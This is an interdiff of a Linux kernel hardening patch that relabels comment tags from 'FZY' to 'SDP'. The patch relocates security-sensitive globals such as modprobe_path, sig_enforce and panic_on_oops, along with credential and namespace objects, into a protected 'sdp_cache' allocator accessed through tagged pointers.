 -		.maxlen		= sizeof(sysctl_io_uring_disabled),
-+		// FZY: Adjust the reference of sysctl_io_uring_disabled
++		// SDP: Adjust the reference of sysctl_io_uring_disabled
 +		.data		= &sysctl_io_uring_disabled_ptr,
 +		.maxlen		= sizeof(int),
  		.mode		= 0644,
 -		.proc_handler	= proc_dointvec_minmax,
-+		// FZY: Use the new proc handler for io_uring_disabled
++		// SDP: Use the new proc handler for io_uring_disabled
 +		.proc_handler	= proc_dointvec_minmax_io_uring_disabled,
  		.extra1		= SYSCTL_ZERO,
  		.extra2		= SYSCTL_TWO,
@@ -10165,7 +10163,7 @@ index 8d1bc6cdfe71..28f6ed65be01 100644
  static inline bool io_uring_allowed(void)
  {
 -	int disabled = READ_ONCE(sysctl_io_uring_disabled);
-+	// FZY: Adjust the reference of sysctl_io_uring_disabled
++	// SDP: Adjust the reference of sysctl_io_uring_disabled
 +	int disabled = READ_ONCE(*sysctl_io_uring_disabled_ptr);
  	kgid_t io_uring_group;
  
@@ -10174,7 +10172,7 @@ index 8d1bc6cdfe71..28f6ed65be01 100644
  
  static int __init io_uring_init(void)
  {
-+	// FZY: Allocate sysctl_io_uring_disabled in sdp_cache
++	// SDP: Allocate sysctl_io_uring_disabled in sdp_cache
 +#ifdef CONFIG_SDP_CACHE
 +	struct sdp_cache *sysctl_io_uring_disabled_cache;
 +	sysctl_io_uring_disabled_cache = sdp_cache_create("sysctl_io_uring_disabled", sizeof(int), cache_line_size());
@@ -10191,14 +10189,14 @@ index 8d1bc6cdfe71..28f6ed65be01 100644
  	BUILD_BUG_ON(offsetof(stype, ename) != eoffset); \
  	BUILD_BUG_ON(sizeof_field(stype, ename) != esize); \
 diff --git a/kernel/bpf/syscall.c b/kernel/bpf/syscall.c
-index d77b2f8b9364..15246c681fe5 100644
+index d77b2f8b9364..ea0264215e8d 100644
 --- a/kernel/bpf/syscall.c
 +++ b/kernel/bpf/syscall.c
 @@ -39,6 +39,11 @@
  
  #include <net/tcx.h>
  
-+// FZY: Include sdp_cache.h to allocate sysctl_unprivileged_bpf_disabled in sdp_cache
++// SDP: Include sdp_cache.h to allocate sysctl_unprivileged_bpf_disabled in sdp_cache
 +#ifdef CONFIG_SDP_CACHE
 +#include <linux/sdp_cache.h>
 +#endif
@@ -10214,7 +10212,7 @@ index d77b2f8b9364..15246c681fe5 100644
 -	IS_BUILTIN(CONFIG_BPF_UNPRIV_DEFAULT_OFF) ? 2 : 0;
 +// int sysctl_unprivileged_bpf_disabled __read_mostly =
 +// 	IS_BUILTIN(CONFIG_BPF_UNPRIV_DEFAULT_OFF) ? 2 : 0;
-+// FZY: Store the sysctl_unprivileged_bpf_disabled value on heap, store its pointer in the global section, and mark it as __tag1
++// SDP: Store the sysctl_unprivileged_bpf_disabled value on heap, store its pointer in the global section, and mark it as __tag1
 +int *__tag1 sysctl_unprivileged_bpf_disabled_ptr;
  
  static const struct bpf_map_ops * const bpf_map_types[] = {
@@ -10224,7 +10222,7 @@ index d77b2f8b9364..15246c681fe5 100644
  	 * capability checks are still carried out.
  	 */
 -	if (sysctl_unprivileged_bpf_disabled && !bpf_capable())
-+	// FZY: Adjust the reference of sysctl_unprivileged_bpf_disabled
++	// SDP: Adjust the reference of sysctl_unprivileged_bpf_disabled
 +	if (*sysctl_unprivileged_bpf_disabled_ptr && !bpf_capable())
  		return -EPERM;
  
@@ -10234,7 +10232,7 @@ index d77b2f8b9364..15246c681fe5 100644
  	 * and other operations.
  	 */
 -	if (sysctl_unprivileged_bpf_disabled && !bpf_capable())
-+	// FZY: Adjust the reference of sysctl_unprivileged_bpf_disabled
++	// SDP: Adjust the reference of sysctl_unprivileged_bpf_disabled
 +	if (*sysctl_unprivileged_bpf_disabled_ptr && !bpf_capable())
  		return -EPERM;
  
@@ -10244,7 +10242,7 @@ index d77b2f8b9364..15246c681fe5 100644
  			      void *buffer, size_t *lenp, loff_t *ppos)
  {
 -	int ret, unpriv_enable = *(int *)table->data;
-+	// FZY: Adjust the reference of sysctl_unprivileged_bpf_disabled
++	// SDP: Adjust the reference of sysctl_unprivileged_bpf_disabled
 +	int ret, unpriv_enable = **(int *__tag1*)table->data;
  	bool locked_state = unpriv_enable == 1;
  	struct ctl_table tmp = *table;
@@ -10254,7 +10252,7 @@ index d77b2f8b9364..15246c681fe5 100644
  		if (locked_state && unpriv_enable != 1)
  			return -EPERM;
 -		*(int *)table->data = unpriv_enable;
-+		// FZY: Adjust the reference of sysctl_unprivileged_bpf_disabled
++		// SDP: Adjust the reference of sysctl_unprivileged_bpf_disabled
 +		**(int *__tag1*)table->data = unpriv_enable;
  	}
  
@@ -10265,7 +10263,7 @@ index d77b2f8b9364..15246c681fe5 100644
  		.procname	= "unprivileged_bpf_disabled",
 -		.data		= &sysctl_unprivileged_bpf_disabled,
 -		.maxlen		= sizeof(sysctl_unprivileged_bpf_disabled),
-+		// FZY: Adjust the reference of sysctl_unprivileged_bpf_disabled
++		// SDP: Adjust the reference of sysctl_unprivileged_bpf_disabled
 +		.data		= &sysctl_unprivileged_bpf_disabled_ptr,
 +		.maxlen		= sizeof(int),
  		.mode		= 0644,
@@ -10277,7 +10275,7 @@ index d77b2f8b9364..15246c681fe5 100644
  static int __init bpf_syscall_sysctl_init(void)
 -{
 +{ 
-+	// FZY: Allocate sysctl_unprivileged_bpf_disabled in sdp_cache
++	// SDP: Allocate sysctl_unprivileged_bpf_disabled in sdp_cache
 +#ifdef CONFIG_SDP_CACHE
 +	struct sdp_cache *sysctl_unprivileged_bpf_disabled_cache;
 +	sysctl_unprivileged_bpf_disabled_cache = sdp_cache_create("sysctl_unprivileged_bpf_disabled", sizeof(int), cache_line_size());
@@ -10295,14 +10293,14 @@ index d77b2f8b9364..15246c681fe5 100644
  	return 0;
  }
 diff --git a/kernel/cred.c b/kernel/cred.c
-index 98cb4eca23fb..6cbfceac325b 100644
+index 98cb4eca23fb..1932648de818 100644
 --- a/kernel/cred.c
 +++ b/kernel/cred.c
 @@ -20,6 +20,11 @@
  #include <linux/cn_proc.h>
  #include <linux/uidgid.h>
  
-+// FZY: Include sdp_cache.h to allocate credentials from sdp_cache instead of kmem_cache
++// SDP: Include sdp_cache.h to allocate credentials from sdp_cache instead of kmem_cache
 +#ifdef CONFIG_SDP_CACHE
 +#include <linux/sdp_cache.h>
 +#endif
@@ -10314,7 +10312,7 @@ index 98cb4eca23fb..6cbfceac325b 100644
  } while (0)
  #endif
  
-+// FZY: Allocate and free credentials from sdp_cache if CONFIG_SDP_CACHE is enabled, otherwise allocate from kmem_cache
++// SDP: Allocate and free credentials from sdp_cache if CONFIG_SDP_CACHE is enabled, otherwise allocate from kmem_cache
 +#ifdef CONFIG_SDP_CACHE
 +static struct sdp_cache *cred_jar;
 +
@@ -10350,7 +10348,7 @@ index 98cb4eca23fb..6cbfceac325b 100644
  	put_user_ns(cred->user_ns);
 -	kmem_cache_free(cred_jar, cred);
 +
-+	// FZY: Free credentials depending on whether CONFIG_SDP_CACHE is enabled
++	// SDP: Free credentials depending on whether CONFIG_SDP_CACHE is enabled
 +	cred_jar_free(cred);
  }
  
@@ -10360,7 +10358,7 @@ index 98cb4eca23fb..6cbfceac325b 100644
  	struct cred *new;
  
 -	new = kmem_cache_zalloc(cred_jar, GFP_KERNEL);
-+	// FZY: Allocate credentials depending on whether CONFIG_SDP_CACHE is enabled
++	// SDP: Allocate credentials depending on whether CONFIG_SDP_CACHE is enabled
 +	new = cred_jar_alloc(GFP_KERNEL);
  	if (!new)
  		return NULL;
@@ -10370,7 +10368,7 @@ index 98cb4eca23fb..6cbfceac325b 100644
  	validate_process_creds();
  
 -	new = kmem_cache_alloc(cred_jar, GFP_KERNEL);
-+	// FZY: Allocate credentials depending on whether CONFIG_SDP_CACHE is enabled
++	// SDP: Allocate credentials depending on whether CONFIG_SDP_CACHE is enabled
 +	new = cred_jar_alloc(GFP_KERNEL);
  	if (!new)
  		return NULL;
@@ -10379,7 +10377,7 @@ index 98cb4eca23fb..6cbfceac325b 100644
   */
  void __init cred_init(void)
  {
-+	// FZY: Initialize the credential cache depending on whether CONFIG_SDP_CACHE is enabled
++	// SDP: Initialize the credential cache depending on whether CONFIG_SDP_CACHE is enabled
 +#ifdef CONFIG_SDP_CACHE
 +	cred_jar = sdp_cache_create("cred_jar", sizeof(struct cred),
 +				    cache_line_size());
@@ -10397,20 +10395,20 @@ index 98cb4eca23fb..6cbfceac325b 100644
  		return NULL;
  
 -	new = kmem_cache_alloc(cred_jar, GFP_KERNEL);
-+	// FZY: Allocate credentials depending on whether CONFIG_SDP_CACHE is enabled
++	// SDP: Allocate credentials depending on whether CONFIG_SDP_CACHE is enabled
 +	new = cred_jar_alloc(GFP_KERNEL);
  	if (!new)
  		return NULL;
  
 diff --git a/kernel/fork.c b/kernel/fork.c
-index 3b6d20dfb9a8..b9c39ffccc66 100644
+index 3b6d20dfb9a8..b32465ae0002 100644
 --- a/kernel/fork.c
 +++ b/kernel/fork.c
 @@ -100,6 +100,11 @@
  #include <linux/user_events.h>
  #include <linux/iommu.h>
  
-+// FZY: Include sdp_cache.h to allocate mm_struct and fs_structfrom sdp_cache instead of kmem_cache
++// SDP: Include sdp_cache.h to allocate mm_struct and fs_structfrom sdp_cache instead of kmem_cache
 +#ifdef CONFIG_SDP_CACHE
 +#include <linux/sdp_cache.h>
 +#endif
@@ -10422,13 +10420,13 @@ index 3b6d20dfb9a8..b9c39ffccc66 100644
  #ifndef CONFIG_ARCH_TASK_STRUCT_ALLOCATOR
  static struct kmem_cache *task_struct_cachep;
  
-+// FZY: Add optnone attribute to make sure set_tag of fields in task_struct is not optimized away
++// SDP: Add optnone attribute to make sure set_tag of fields in task_struct is not optimized away
  static inline struct task_struct *alloc_task_struct_node(int node)
  {
  	return kmem_cache_alloc_node(task_struct_cachep, GFP_KERNEL, node);
  }
  
-+// FZY: Add optnone attribute to make sure set_tag of fields in task_struct is not optimized away
++// SDP: Add optnone attribute to make sure set_tag of fields in task_struct is not optimized away
  static inline void free_task_struct(struct task_struct *tsk)
  {
  	kmem_cache_free(task_struct_cachep, tsk);
@@ -10436,7 +10434,7 @@ index 3b6d20dfb9a8..b9c39ffccc66 100644
  struct kmem_cache *files_cachep;
  
  /* SLAB cache for fs_struct structures (tsk->fs) */
-+// FZY: Allocate fs_struct from sdp_cache if CONFIG_SDP_CACHE is enabled, otherwise allocate from kmem_cache
++// SDP: Allocate fs_struct from sdp_cache if CONFIG_SDP_CACHE is enabled, otherwise allocate from kmem_cache
 +#ifdef CONFIG_SDP_CACHE
 +struct sdp_cache *fs_sdp_cache;
 +#else
@@ -10449,7 +10447,7 @@ index 3b6d20dfb9a8..b9c39ffccc66 100644
  /* SLAB cache for mm_struct structures (tsk->mm) */
  static struct kmem_cache *mm_cachep;
  
-+// FZY: Allocate and free mm_struct from sdp_cache if CONFIG_SDP_CACHE is enabled, otherwise allocate from kmem_cache
++// SDP: Allocate and free mm_struct from sdp_cache if CONFIG_SDP_CACHE is enabled, otherwise allocate from kmem_cache
 +#ifdef CONFIG_SDP_CACHE
 +static struct sdp_cache *mm_sdp_cache;
 +#endif
@@ -10461,7 +10459,7 @@ index 3b6d20dfb9a8..b9c39ffccc66 100644
  #endif
  }
  
-+// FZY: Allocate and free mm_struct from sdp_cache if CONFIG_SDP_CACHE is enabled, otherwise allocate from kmem_cache
++// SDP: Allocate and free mm_struct from sdp_cache if CONFIG_SDP_CACHE is enabled, otherwise allocate from kmem_cache
 +#ifdef CONFIG_SDP_CACHE
 +#define allocate_mm()	((struct mm_struct *)sdp_cache_alloc(mm_sdp_cache))
 +#define free_mm(mm)	(sdp_cache_free(mm_sdp_cache, (mm)))
@@ -10476,7 +10474,7 @@ index 3b6d20dfb9a8..b9c39ffccc66 100644
  #ifndef CONFIG_ARCH_TASK_STRUCT_ALLOCATOR
  static void task_struct_whitelist(unsigned long *offset, unsigned long *size)
  {
-+	// FZY: When thread_struct is allocated separately via sdp_cache, the usercopy whitelist for thread_struct in task_struct does not apply
++	// SDP: When thread_struct is allocated separately via sdp_cache, the usercopy whitelist for thread_struct in task_struct does not apply
 +#ifdef CONFIG_SDP_CACHE
 +	*offset = 0;
 +	*size = 0;
@@ -10496,7 +10494,7 @@ index 3b6d20dfb9a8..b9c39ffccc66 100644
  	 */
  	mm_size = sizeof(struct mm_struct) + cpumask_size() + mm_cid_size();
  
-+// FZY: Initialize sdp_cache for mm_struct if CONFIG_SDP_CACHE is enabled, otherwise initialize kmem_cache
++// SDP: Initialize sdp_cache for mm_struct if CONFIG_SDP_CACHE is enabled, otherwise initialize kmem_cache
 +#ifdef CONFIG_SDP_CACHE
 +	mm_sdp_cache = sdp_cache_create("mm_struct", mm_size,
 +					cache_line_size());
@@ -10517,7 +10515,7 @@ index 3b6d20dfb9a8..b9c39ffccc66 100644
  			sizeof(struct files_struct), 0,
  			SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT,
  			NULL);
-+// FZY: Initialize sdp_cache for fs_struct if CONFIG_SDP_CACHE is enabled, otherwise initialize kmem_cache
++// SDP: Initialize sdp_cache for fs_struct if CONFIG_SDP_CACHE is enabled, otherwise initialize kmem_cache
 +#ifdef CONFIG_SDP_CACHE
 +	fs_sdp_cache = sdp_cache_create("fs_struct",
 +					sizeof(struct fs_struct),
@@ -10534,7 +10532,7 @@ index 3b6d20dfb9a8..b9c39ffccc66 100644
  	vm_area_cachep = KMEM_CACHE(vm_area_struct, SLAB_PANIC|SLAB_ACCOUNT);
  #ifdef CONFIG_PER_VMA_LOCK
 diff --git a/kernel/kexec_core.c b/kernel/kexec_core.c
-index 9dc728982d79..2a15cc7a1bad 100644
+index 9dc728982d79..e3683451f468 100644
 --- a/kernel/kexec_core.c
 +++ b/kernel/kexec_core.c
 @@ -82,7 +82,8 @@ int kexec_should_crash(struct task_struct *p)
@@ -10542,13 +10540,13 @@ index 9dc728982d79..2a15cc7a1bad 100644
  	 * corresponds to each of these 4 conditions.
  	 */
 -	if (in_interrupt() || !p->pid || is_global_init(p) || panic_on_oops)
-+	// FZY: Adjust the reference of panic_on_oops
++	// SDP: Adjust the reference of panic_on_oops
 +	if (in_interrupt() || !p->pid || is_global_init(p) || *panic_on_oops_ptr)
  		return 1;
  	return 0;
  }
 diff --git a/kernel/ksyms_common.c b/kernel/ksyms_common.c
-index cf1a73cbf2f6..f4492e107932 100644
+index cf1a73cbf2f6..5899d1c0edf7 100644
 --- a/kernel/ksyms_common.c
 +++ b/kernel/ksyms_common.c
 @@ -27,7 +27,8 @@ static inline int kallsyms_for_perf(void)
@@ -10556,20 +10554,20 @@ index cf1a73cbf2f6..f4492e107932 100644
  bool kallsyms_show_value(const struct cred *cred)
  {
 -	switch (kptr_restrict) {
-+	// FZY: Adjust the reference of kptr_restrict
++	// SDP: Adjust the reference of kptr_restrict
 +	switch (*kptr_restrict_ptr) {
  	case 0:
  		if (kallsyms_for_perf())
  			return true;
 diff --git a/kernel/module/kmod.c b/kernel/module/kmod.c
-index 0800d9891692..b74ca32ad50a 100644
+index 0800d9891692..daf3ca600818 100644
 --- a/kernel/module/kmod.c
 +++ b/kernel/module/kmod.c
 @@ -29,6 +29,11 @@
  #include <linux/async.h>
  #include <linux/uaccess.h>
  
-+// FZY: Include sdp_cache.h to allocate modprobe_path from sdp_cache instead of kmalloc
++// SDP: Include sdp_cache.h to allocate modprobe_path from sdp_cache instead of kmalloc
 +#ifdef CONFIG_SDP_CACHE
 +#include <linux/sdp_cache.h>
 +#endif
@@ -10583,16 +10581,16 @@ index 0800d9891692..b74ca32ad50a 100644
  */
 -char modprobe_path[KMOD_PATH_LEN] = CONFIG_MODPROBE_PATH;
 +
-+// FZY: Store the modprobe_path string on heap, store its pointer in the global section, and mark it as __tag1
++// SDP: Store the modprobe_path string on heap, store its pointer in the global section, and mark it as __tag1
 +// char modprobe_path[KMOD_PATH_LEN] = CONFIG_MODPROBE_PATH;
 +char *__tag1 modprobe_path;
 +
-+// FZY: Cache for modprobe_path allocation via sdp_cache
++// SDP: Cache for modprobe_path allocation via sdp_cache
 +#ifdef CONFIG_SDP_CACHE
 +static struct sdp_cache *modprobe_path_cache;
 +#endif
 +
-+// FZY: Initialize modprobe_path from sdp_cache if CONFIG_SDP_CACHE is enabled, otherwise use kzalloc
++// SDP: Initialize modprobe_path from sdp_cache if CONFIG_SDP_CACHE is enabled, otherwise use kzalloc
 +void __init modprobe_path_init(void)
 +{
 +#ifdef CONFIG_SDP_CACHE
@@ -10621,7 +10619,7 @@ index 0800d9891692..b74ca32ad50a 100644
  static void free_modprobe_argv(struct subprocess_info *info)
  {
 diff --git a/kernel/module/signing.c b/kernel/module/signing.c
-index a2ff4242e623..1d694ad529b1 100644
+index a2ff4242e623..f84cb84b5115 100644
 --- a/kernel/module/signing.c
 +++ b/kernel/module/signing.c
 @@ -9,18 +9,72 @@
@@ -10634,7 +10632,7 @@ index a2ff4242e623..1d694ad529b1 100644
  #include <linux/security.h>
  #include <crypto/public_key.h>
  #include <uapi/linux/module.h>
-+// FZY: Include sdp_cache.h to allocate sig_enforce from sdp_cache instead of kmalloc
++// SDP: Include sdp_cache.h to allocate sig_enforce from sdp_cache instead of kmalloc
 +#ifdef CONFIG_SDP_CACHE
 +#include <linux/sdp_cache.h>
 +#endif
@@ -10647,15 +10645,15 @@ index a2ff4242e623..1d694ad529b1 100644
 -static bool sig_enforce = IS_ENABLED(CONFIG_MODULE_SIG_FORCE);
 -module_param(sig_enforce, bool_enable_only, 0644);
 +// static bool sig_enforce = IS_ENABLED(CONFIG_MODULE_SIG_FORCE);
-+// FZY: Store the sig_enforce bool on heap, store its pointer in the global section, and mark it as __tag1
++// SDP: Store the sig_enforce bool on heap, store its pointer in the global section, and mark it as __tag1
 +static bool *__tag1 sig_enforce_ptr;
 +
-+// FZY: Cache for sig_enforce_ptr allocation via sdp_cache
++// SDP: Cache for sig_enforce_ptr allocation via sdp_cache
 +#ifdef CONFIG_SDP_CACHE
 +static struct sdp_cache *sig_enforce_cache;
 +#endif
 +
-+// FZY: Custom getter/setter that works with pointer indirection
++// SDP: Custom getter/setter that works with pointer indirection
 +static int sig_enforce_set(const char *val, const struct kernel_param *kp)
 +{
 +	struct kernel_param tmp_kp = *kp;
@@ -10678,7 +10676,7 @@ index a2ff4242e623..1d694ad529b1 100644
 +
 +module_param_cb(sig_enforce, &sig_enforce_ops, NULL, 0644);
 +
-+// FZY: Initialize sig_enforce_ptr from sdp_cache if CONFIG_SDP_CACHE is enabled, otherwise use kzalloc
++// SDP: Initialize sig_enforce_ptr from sdp_cache if CONFIG_SDP_CACHE is enabled, otherwise use kzalloc
 +static int __init sig_enforce_init(void)
 +{
 +#ifdef CONFIG_SDP_CACHE
@@ -10704,7 +10702,7 @@ index a2ff4242e623..1d694ad529b1 100644
  bool is_module_sig_enforced(void)
  {
 -	return sig_enforce;
-+	// FZY: Adjust the reference of sig_enforce
++	// SDP: Adjust the reference of sig_enforce
 +	return *sig_enforce_ptr;
  }
  EXPORT_SYMBOL(is_module_sig_enforced);
@@ -10712,25 +10710,25 @@ index a2ff4242e623..1d694ad529b1 100644
  void set_module_sig_enforced(void)
  {
 -	sig_enforce = true;
-+	// FZY: Adjust the reference of sig_enforce
++	// SDP: Adjust the reference of sig_enforce
 +	*sig_enforce_ptr = true;
  }
  
  /*
 diff --git a/kernel/nsproxy.c b/kernel/nsproxy.c
-index 15781acaac1c..d5f4e2d78632 100644
+index 15781acaac1c..530805aa0304 100644
 --- a/kernel/nsproxy.c
 +++ b/kernel/nsproxy.c
 @@ -27,7 +27,21 @@
  #include <linux/cgroup.h>
  #include <linux/perf_event.h>
  
-+// FZY: Include sdp_cache.h to allocate nsproxy from sdp_cache instead of kmem_cache
++// SDP: Include sdp_cache.h to allocate nsproxy from sdp_cache instead of kmem_cache
 +#ifdef CONFIG_SDP_CACHE
 +#include <linux/sdp_cache.h>
 +#endif
 +
-+// FZY: Allocate and free nsproxy from sdp_cache if CONFIG_SDP_CACHE is enabled, otherwise allocate from kmem_cache
++// SDP: Allocate and free nsproxy from sdp_cache if CONFIG_SDP_CACHE is enabled, otherwise allocate from kmem_cache
 +#ifdef CONFIG_SDP_CACHE
 +static struct sdp_cache *nsproxy_sdp_cache;
 +#define alloc_nsproxy()		((struct nsproxy *)sdp_cache_alloc(nsproxy_sdp_cache))
@@ -10748,7 +10746,7 @@ index 15781acaac1c..d5f4e2d78632 100644
  	struct nsproxy *nsproxy;
  
 -	nsproxy = kmem_cache_alloc(nsproxy_cachep, GFP_KERNEL);
-+	// FZY: Allocate nsproxy from sdp_cache if CONFIG_SDP_CACHE is enabled, otherwise allocate from kmem_cache
++	// SDP: Allocate nsproxy from sdp_cache if CONFIG_SDP_CACHE is enabled, otherwise allocate from kmem_cache
 +	nsproxy = alloc_nsproxy();
  	if (nsproxy)
  		refcount_set(&nsproxy->count, 1);
@@ -10758,7 +10756,7 @@ index 15781acaac1c..d5f4e2d78632 100644
  		put_mnt_ns(new_nsp->mnt_ns);
  out_ns:
 -	kmem_cache_free(nsproxy_cachep, new_nsp);
-+	// FZY: Allocate nsproxy from sdp_cache if CONFIG_SDP_CACHE is enabled, otherwise allocate from kmem_cache
++	// SDP: Allocate nsproxy from sdp_cache if CONFIG_SDP_CACHE is enabled, otherwise allocate from kmem_cache
 +	free_nsproxy_cache(new_nsp);
  	return ERR_PTR(err);
  }
@@ -10768,7 +10766,7 @@ index 15781acaac1c..d5f4e2d78632 100644
  	put_cgroup_ns(ns->cgroup_ns);
  	put_net(ns->net_ns);
 -	kmem_cache_free(nsproxy_cachep, ns);
-+	// FZY: Allocate nsproxy from sdp_cache if CONFIG_SDP_CACHE is enabled, otherwise allocate from kmem_cache
++	// SDP: Allocate nsproxy from sdp_cache if CONFIG_SDP_CACHE is enabled, otherwise allocate from kmem_cache
 +	free_nsproxy_cache(ns);
  }
  
@@ -10777,7 +10775,7 @@ index 15781acaac1c..d5f4e2d78632 100644
  
  int __init nsproxy_cache_init(void)
  {
-+// FZY: Initialize sdp_cache for nsproxy if CONFIG_SDP_CACHE is enabled, otherwise initialize kmem_cache
++// SDP: Initialize sdp_cache for nsproxy if CONFIG_SDP_CACHE is enabled, otherwise initialize kmem_cache
 +#ifdef CONFIG_SDP_CACHE
 +	nsproxy_sdp_cache = sdp_cache_create("nsproxy",
 +					     sizeof(struct nsproxy),
@@ -10790,14 +10788,14 @@ index 15781acaac1c..d5f4e2d78632 100644
  	return 0;
  }
 diff --git a/kernel/panic.c b/kernel/panic.c
-index ffa037fa777d..302c202b6fb5 100644
+index ffa037fa777d..b55346bc234b 100644
 --- a/kernel/panic.c
 +++ b/kernel/panic.c
 @@ -38,6 +38,11 @@
  #include <trace/events/error_report.h>
  #include <asm/sections.h>
  
-+// FZY: Include sdp_cache.h to allocate panic_on_oops in sdp_cache
++// SDP: Include sdp_cache.h to allocate panic_on_oops in sdp_cache
 +#ifdef CONFIG_SDP_CACHE
 +#include <linux/sdp_cache.h>
 +#endif
@@ -10811,7 +10809,7 @@ index ffa037fa777d..302c202b6fb5 100644
  
 -int panic_on_oops = CONFIG_PANIC_ON_OOPS_VALUE;
 +// int panic_on_oops = CONFIG_PANIC_ON_OOPS_VALUE;
-+// FZY: Store the panic_on_oops value on heap, store its pointer in the global section, and mark it as __tag1
++// SDP: Store the panic_on_oops value on heap, store its pointer in the global section, and mark it as __tag1
 +int *__tag1 panic_on_oops_ptr;
 +
  static unsigned long tainted_mask =
@@ -10821,7 +10819,7 @@ index ffa037fa777d..302c202b6fb5 100644
  
  static __init int kernel_panic_sysctls_init(void)
  {
-+	// FZY: Allocate panic_on_oops in sdp_cache
++	// SDP: Allocate panic_on_oops in sdp_cache
 +#ifdef CONFIG_SDP_CACHE
 +	struct sdp_cache *panic_on_oops_cache;
 +	panic_on_oops_cache = sdp_cache_create("panic_on_oops", sizeof(int), cache_line_size());
@@ -10843,7 +10841,7 @@ index ffa037fa777d..302c202b6fb5 100644
  {
  	if (!s)
  		return -EINVAL;
-+	// FZY: Adjust the reference of panic_on_oops
++	// SDP: Adjust the reference of panic_on_oops
  	if (!strcmp(s, "panic"))
 -		panic_on_oops = 1;
 +		*panic_on_oops_ptr = 1;
@@ -10851,14 +10849,14 @@ index ffa037fa777d..302c202b6fb5 100644
  }
  early_param("oops", oops_setup);
 diff --git a/kernel/printk/sysctl.c b/kernel/printk/sysctl.c
-index c228343eeb97..2bfdea6c72b1 100644
+index c228343eeb97..cfd7dd2ce533 100644
 --- a/kernel/printk/sysctl.c
 +++ b/kernel/printk/sysctl.c
 @@ -9,6 +9,11 @@
  #include <linux/ratelimit.h>
  #include "internal.h"
  
-+// FZY: Include sdp_cache.h to allocate aa_g_audit in sdp_cache
++// SDP: Include sdp_cache.h to allocate aa_g_audit in sdp_cache
 +#ifdef CONFIG_SDP_CACHE
 +#include <linux/sdp_cache.h>
 +#endif
@@ -10870,7 +10868,7 @@ index c228343eeb97..2bfdea6c72b1 100644
  	return proc_dointvec_minmax(table, write, buffer, lenp, ppos);
  }
  
-+// FZY: A special handler for kptr_restrict where table->data points to a pointer instead of the actual int. Use a temporary table to pass the actual data pointer to the standard handler here
++// SDP: A special handler for kptr_restrict where table->data points to a pointer instead of the actual int. Use a temporary table to pass the actual data pointer to the standard handler here
 +static int proc_dointvec_minmax_sysadmin_kptr_restrict(struct ctl_table *table, int write, void *buffer, size_t *lenp, loff_t *ppos)
 +{
 +	if (write && !capable(CAP_SYS_ADMIN))
@@ -10888,14 +10886,14 @@ index c228343eeb97..2bfdea6c72b1 100644
  		.extra2		= SYSCTL_ONE,
  	},
  	{
-+		// FZY: Adjust the reference of kptr_restrict
++		// SDP: Adjust the reference of kptr_restrict
  		.procname	= "kptr_restrict",
 -		.data		= &kptr_restrict,
 +		.data		= &kptr_restrict_ptr,
  		.maxlen		= sizeof(int),
  		.mode		= 0644,
 -		.proc_handler	= proc_dointvec_minmax_sysadmin,
-+		// FZY: Use the new proc handler for kptr_restrict
++		// SDP: Use the new proc handler for kptr_restrict
 +		.proc_handler	= proc_dointvec_minmax_sysadmin_kptr_restrict,
  		.extra1		= SYSCTL_ZERO,
  		.extra2		= SYSCTL_TWO,
@@ -10904,7 +10902,7 @@ index c228343eeb97..2bfdea6c72b1 100644
  
  void __init printk_sysctl_init(void)
  {
-+	// FZY: Allocate kptr_restrict in sdp_cache
++	// SDP: Allocate kptr_restrict in sdp_cache
 +#ifdef CONFIG_SDP_CACHE
 +	struct sdp_cache *kptr_restrict_cache;
 +	kptr_restrict_cache = sdp_cache_create("kptr_restrict", sizeof(int), cache_line_size());
@@ -10920,14 +10918,14 @@ index c228343eeb97..2bfdea6c72b1 100644
  	register_sysctl_init("kernel", printk_sysctls);
  }
 diff --git a/kernel/sysctl.c b/kernel/sysctl.c
-index 354a2d294f52..72c8ac174f96 100644
+index 354a2d294f52..8d2136c76bab 100644
 --- a/kernel/sysctl.c
 +++ b/kernel/sysctl.c
 @@ -745,6 +745,15 @@ int proc_dointvec(struct ctl_table *table, int write, void *buffer,
  	return do_proc_dointvec(table, write, buffer, lenp, ppos, NULL, NULL);
  }
  
-+// FZY: A special handler for panic_on_oops where table->data points to a pointer instead of the actual int. Use a temporary table to pass the actual data pointer to the standard handler here
++// SDP: A special handler for panic_on_oops where table->data points to a pointer instead of the actual int. Use a temporary table to pass the actual data pointer to the standard handler here
 +int proc_dointvec_panic_on_oops(struct ctl_table *table, int write, void *buffer, size_t *lenp, loff_t *ppos)
 +{
 +	struct ctl_table tmp;
@@ -10943,7 +10941,7 @@ index 354a2d294f52..72c8ac174f96 100644
  				do_proc_dointvec_minmax_conv, &param);
  }
  
-+// FZY: A special handler for io_uring_disabled where table->data points to a pointer instead of the actual int. Use a temporary table to pass the actual data pointer to the standard handler here
++// SDP: A special handler for io_uring_disabled where table->data points to a pointer instead of the actual int. Use a temporary table to pass the actual data pointer to the standard handler here
 +int proc_dointvec_minmax_io_uring_disabled(struct ctl_table *table, int write, void *buffer, size_t *lenp, loff_t *ppos)
 +{
 +	struct ctl_table tmp;
@@ -10964,33 +10962,27 @@ index 354a2d294f52..72c8ac174f96 100644
  	{
  		.procname	= "panic_on_oops",
 -		.data		= &panic_on_oops,
-+		// FZY: Adjust the reference of panic_on_oops
++		// SDP: Adjust the reference of panic_on_oops
 +		.data		= &panic_on_oops_ptr,
  		.maxlen		= sizeof(int),
  		.mode		= 0644,
 -		.proc_handler	= proc_dointvec,
-+		// FZY: Use the new proc_handler for panic_on_oops
++		// SDP: Use the new proc_handler for panic_on_oops
 +		.proc_handler	= proc_dointvec_panic_on_oops,
  	},
  	{
  		.procname	= "panic_print",
 diff --git a/lib/genalloc.c b/lib/genalloc.c
-index 4fa5635bf81b..e258a92819e0 100644
+index 4fa5635bf81b..a38b06b12124 100644
 --- a/lib/genalloc.c
 +++ b/lib/genalloc.c
-@@ -519,6 +519,55 @@ void gen_pool_free_owner(struct gen_pool *pool, unsigned long addr, size_t size,
+@@ -519,6 +519,41 @@ void gen_pool_free_owner(struct gen_pool *pool, unsigned long addr, size_t size,
  }
  EXPORT_SYMBOL(gen_pool_free_owner);
  
-+// FZY: For sdp_cache implementation
-+/**
-+ * gen_pool_find_chunk - find the chunk containing a given address
-+ * @pool: the generic memory pool
-+ * @addr: address to look up
-+ *
-+ * Returns the chunk containing @addr, or NULL if not found.
-+ * Caller must hold rcu_read_lock().
-+ */
++// SDP: For sdp_cache implementation
++// gen_pool_find_chunk - find the chunk containing @addr, or NULL if none.
++// Caller must hold rcu_read_lock()
 +struct gen_pool_chunk *gen_pool_find_chunk(struct gen_pool *pool,
 +					  unsigned long addr)
 +{
